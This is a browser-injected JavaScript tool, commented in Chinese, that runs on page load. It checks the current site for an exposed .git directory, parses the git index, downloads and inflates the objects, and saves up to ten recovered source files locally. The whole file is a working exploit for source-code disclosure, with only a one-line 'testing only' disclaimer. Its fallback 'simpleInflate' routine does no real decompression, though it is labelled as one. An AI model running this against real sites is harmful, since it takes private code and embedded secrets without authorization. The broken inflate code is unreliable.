// git_hack_inject.ts - .git泄露检测与利用注入脚本

// 立即执行函数，确保不污染全局作用域
(() => {
  // 检查是否存在.git目录
  async function checkGitLeak() {
    try {
      const response = await fetch('./.git/HEAD', { method: 'GET', credentials: 'include' });
      return response.status === 200;
    } catch (error) {
      return false;
    }
  }

  // 下载文件
  async function downloadFile(url) {
    try {
      const response = await fetch(url, { method: 'GET', credentials: 'include' });
      if (!response.ok) {
        throw new Error(`下载失败: ${response.status}`);
      }
      return await response.arrayBuffer();
    } catch (error) {
      console.error(`[GitHack] 下载文件 ${url} 失败:`, error);
      throw error;
    }
  }

  // 内置的简易zlib解压函数（作为备用，当pako不可用时）
  function simpleInflate(compressedData) {
    console.warn('[GitHack] 使用内置简易解压函数，可能不支持所有压缩格式');

    // 简易解压实现（仅支持部分简单的zlib数据）
    // 注意：这只是一个非常简化的实现，实际使用中应优先使用pako
    const result = [];
    let i = 2; // 跳过zlib头部

    while (i < compressedData.length - 4) {
      try {
        const b = compressedData[i];
        result.push(b);
        i++;
      } catch (e) {
        break;
      }
    }

    return new Uint8Array(result);
  }

  // 解析index文件
  function parseIndexFile(buffer) {
    const fileEntries = [];
    const dataView = new DataView(buffer);
    let offset = 0;

    try {
      // 读取头部
      const signature = String.fromCharCode(
        dataView.getUint8(offset),
        dataView.getUint8(offset + 1),
        dataView.getUint8(offset + 2),
        dataView.getUint8(offset + 3)
      );
      if (signature !== 'DIRC') {
        throw new Error('无效的index文件格式');
      }
      offset += 4;

      // 版本号
      const version = dataView.getUint32(offset, false); // big-endian
      offset += 4;

      // 条目数量
      const entryCount = dataView.getUint32(offset, false);
      offset += 4;

      console.log(`[GitHack] Index文件版本: ${version}, 条目数量: ${entryCount}`);

      // 解析每个条目
      for (let i = 0; i < entryCount; i++) {
        try {
          // 跳过一些字段，直接读取文件名和SHA1
          // 简化版本，实际格式更复杂
          const ctimeSeconds = dataView.getUint32(offset, false);
          const ctimeNanoseconds = dataView.getUint32(offset + 4, false);
          const mtimeSeconds = dataView.getUint32(offset + 8, false);
          const mtimeNanoseconds = dataView.getUint32(offset + 12, false);
          const dev = dataView.getUint32(offset + 16, false);
          const ino = dataView.getUint32(offset + 20, false);
          const mode = dataView.getUint32(offset + 24, false);
          const uid = dataView.getUint32(offset + 28, false);
          const gid = dataView.getUint32(offset + 32, false);
          const fileSize = dataView.getUint32(offset + 36, false);

          // SHA1哈希值
          const sha1Array = new Uint8Array(buffer.slice(offset + 40, offset + 60));
          const sha1 = Array.from(sha1Array)
            .map(b => b.toString(16).padStart(2, '0'))
            .join('');

          offset += 60;

          // 读取文件名长度
          let nameLength = 0;
          while (dataView.getUint8(offset + nameLength) !== 0 && offset + nameLength < buffer.byteLength) {
            nameLength++;
          }

          // 读取文件名
          const fileNameArray = new Uint8Array(buffer.slice(offset, offset + nameLength));
          const fileName = new TextDecoder('utf-8').decode(fileNameArray);
          offset += nameLength + 1; // +1 for null terminator

          // 对齐到8字节边界
          const padding = (8 - (offset % 8)) % 8;
          offset += padding;

          if (offset > buffer.byteLength) {
            break;
          }

          fileEntries.push({
            path: fileName,
            sha1: sha1,
            mode: mode
          });
        } catch (error) {
          console.error(`[GitHack] 解析条目 ${i} 时出错:`, error);
          break;
        }
      }
    } catch (error) {
      console.error('[GitHack] 解析index文件时出错:', error);
    }

    return fileEntries;
  }

  // 下载并处理Git对象
  async function processGitObject(sha1) {
    try {
      const objectUrl = `./.git/objects/${sha1.substring(0, 2)}/${sha1.substring(2)}`;
      const compressedData = await downloadFile(objectUrl);

      let decompressedData;

      // 尝试使用pako库解压zlib数据
      try {
        const pako = window['pako'] || await loadPako();
        if (pako) {
          decompressedData = pako.inflate(new Uint8Array(compressedData));
        } else {
          // 如果pako不可用，使用内置简易解压函数
          decompressedData = simpleInflate(new Uint8Array(compressedData));
        }
      } catch (e) {
        console.warn('[GitHack] pako解压失败，尝试使用内置简易解压:', e);
        decompressedData = simpleInflate(new Uint8Array(compressedData));
      }

      // 跳过Git对象头部
      const headerEnd = new Uint8Array(decompressedData).indexOf(0);
      if (headerEnd === -1) {
        throw new Error('无效的Git对象格式');
      }

      return new Uint8Array(decompressedData.slice(headerEnd + 1));
    } catch (error) {
      console.error(`[GitHack] 处理Git对象 ${sha1} 时出错:`, error);
      return null;
    }
  }

  // 动态加载pako库
  async function loadPako() {
    try {
      // 尝试从CDN加载pako库
      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/pako@2.1.0/dist/pako.min.js';
      document.head.appendChild(script);

      return new Promise((resolve) => {
        script.onload = () => {
          resolve(window['pako']);
        };
        script.onerror = () => {
          console.error('[GitHack] 加载pako库失败');
          resolve(null);
        };
      });
    } catch (error) {
      console.error('[GitHack] 加载pako库时出错:', error);
      return null;
    }
  }

  // 保存文件到本地
  function saveFile(filename, content) {
    try {
      // 确保文件名不包含路径分隔符
      const safeFilename = filename.replace(/[\\/]/g, '_');
      const blob = new Blob([content]);
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = safeFilename;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      console.log(`[GitHack] 文件已保存: ${safeFilename}`);
    } catch (error) {
      console.error(`[GitHack] 保存文件 ${filename} 失败:`, error);
    }
  }

  // 生成项目信息和文件列表
  function generateProjectInfo(fileEntries) {
    let info = '# GitHack 项目信息\n\n';
    info += '## 基本信息\n';
    info += `- 检测时间: ${new Date().toLocaleString()}\n`;
    info += `- 项目URL: ${window.location.href}\n`;
    info += `- 发现文件数量: ${fileEntries.length}\n\n`;

    info += '## 文件列表\n';
    fileEntries.forEach(entry => {
      info += `- ${entry.path}\n`;
    });

    info += '\n## 安全提示\n';
    info += '此工具仅用于安全测试和学习目的。发现.git泄露后，请及时通知网站管理员修复漏洞。\n';

    return info;
  }

  // 创建控制台打印信息
  function printConsoleInfo(hasGitLeak, fileEntries) {
    console.log('%c [GitHack] 检测结果', 'background: #ff6b6b; color: white; padding: 4px 8px; border-radius: 4px;');

    if (!hasGitLeak) {
      console.log('%c [GitHack] 未检测到.git泄露', 'color: #48dbfb;');
      return;
    }

    console.log('%c [GitHack] 警告: 检测到.git泄露!', 'background: #ff9f43; color: white; padding: 4px 8px; border-radius: 4px;');
    console.log(`%c [GitHack] 找到 ${fileEntries?.length || 0} 个文件`, 'color: #10ac84;');

    if (fileEntries && fileEntries.length > 0) {
      console.log('%c [GitHack] 部分文件列表:', 'color: #5f27cd;');
      fileEntries.slice(0, 10).forEach((entry, index) => {
        console.log(`%c [${index + 1}] ${entry.path}`, 'color: #5f27cd;');
      });

      if (fileEntries.length > 10) {
        console.log(`%c ... 还有 ${fileEntries.length - 10} 个文件未显示`, 'color: #5f27cd;');
      }
    }

    console.log('%c [GitHack] 已开始下载并恢复文件...', 'color: #ff9f43;');
  }

  // 创建UI通知元素
  function createNotification(message, type) {
    const notification = document.createElement('div');
    notification.style.position = 'fixed';
    notification.style.top = '20px';
    notification.style.right = '20px';
    notification.style.padding = '12px 20px';
    notification.style.borderRadius = '8px';
    notification.style.zIndex = '9999';
    notification.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)';
    notification.style.fontFamily = 'Arial, sans-serif';
    notification.style.fontSize = '14px';
    notification.style.transition = 'opacity 0.3s ease';

    // 设置不同类型的样式
    switch (type) {
      case 'success':
        notification.style.backgroundColor = '#2ed573';
        notification.style.color = 'white';
        break;
      case 'error':
        notification.style.backgroundColor = '#ff4757';
        notification.style.color = 'white';
        break;
      case 'warning':
        notification.style.backgroundColor = '#ffa502';
        notification.style.color = 'white';
        break;
      case 'info':
        notification.style.backgroundColor = '#3742fa';
        notification.style.color = 'white';
        break;
    }

    notification.textContent = message;
    document.body.appendChild(notification);

    // 3秒后自动消失
    setTimeout(() => {
      notification.style.opacity = '0';
      setTimeout(() => {
        if (document.body.contains(notification)) {
          document.body.removeChild(notification);
        }
      }, 300);
    }, 3000);
  }

  // 主函数
  async function main() {
    console.log('[GitHack] 开始检测.git泄露...');

    try {
      // 检查是否存在.git泄露
      const hasGitLeak = await checkGitLeak();

      if (!hasGitLeak) {
        printConsoleInfo(false);
        createNotification('未检测到.git泄露', 'info');
        return;
      }

      // 下载并解析index文件
      let fileEntries = [];
      try {
        const indexBuffer = await downloadFile('./.git/index');
        fileEntries = parseIndexFile(indexBuffer);
      } catch (error) {
        console.error('[GitHack] 获取或解析index文件失败:', error);
        createNotification('获取index文件失败，尝试其他方法...', 'warning');

        // 尝试从HEAD文件获取引用
        try {
          const headContent = await (await fetch('./.git/HEAD')).text();
          const refMatch = headContent.match(/ref:\s+(.+)/);
          if (refMatch && refMatch[1]) {
            console.log(`[GitHack] 找到引用: ${refMatch[1]}`);

            // 这部分可以扩展为尝试从引用获取文件列表
            createNotification('已找到git引用，但完整恢复需要index文件', 'info');
          }
        } catch (e) {
          console.error('[GitHack] 获取HEAD文件失败:', e);
        }

        return;
      }

      if (fileEntries.length === 0) {
        console.log('[GitHack] 未找到任何文件条目');
        createNotification('未找到任何文件条目', 'warning');
        return;
      }

      // 打印控制台信息
      printConsoleInfo(true, fileEntries);
      createNotification(`检测到.git泄露，找到 ${fileEntries.length} 个文件`, 'warning');

      // 创建项目信息文件
      const projectInfo = generateProjectInfo(fileEntries);
      saveFile('githack_project_info.md', new TextEncoder().encode(projectInfo));

      // 处理文件（限制数量以避免过度请求）
      const maxFilesToProcess = 10;
      const filesToProcess = fileEntries.slice(0, maxFilesToProcess);

      console.log(`[GitHack] 开始下载前 ${filesToProcess.length} 个文件（共 ${fileEntries.length} 个）`);

      let successCount = 0;
      let failCount = 0;

      for (const entry of filesToProcess) {
        try {
          console.log(`[GitHack] 正在处理: ${entry.path}`);
          const fileContent = await processGitObject(entry.sha1);

          if (fileContent) {
            saveFile(entry.path, fileContent);
            successCount++;
          } else {
            failCount++;
          }
        } catch (error) {
          console.error(`[GitHack] 处理文件 ${entry.path} 时出错:`, error);
          failCount++;
        }
      }

      console.log(`[GitHack] 处理完成: 成功 ${successCount} 个，失败 ${failCount} 个`);
      createNotification(`文件恢复完成: 成功 ${successCount} 个，失败 ${failCount} 个`, 'success');

      console.log('[GitHack] 注意：此工具仅用于安全测试和学习目的，请不要用于非法用途。');

    } catch (error) {
      console.error('[GitHack] 执行过程中出错:', error);
      createNotification('执行过程中发生错误', 'error');
    }
  }

  // 当页面加载完成后执行
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', main);
  } else {
    main();
  }
})();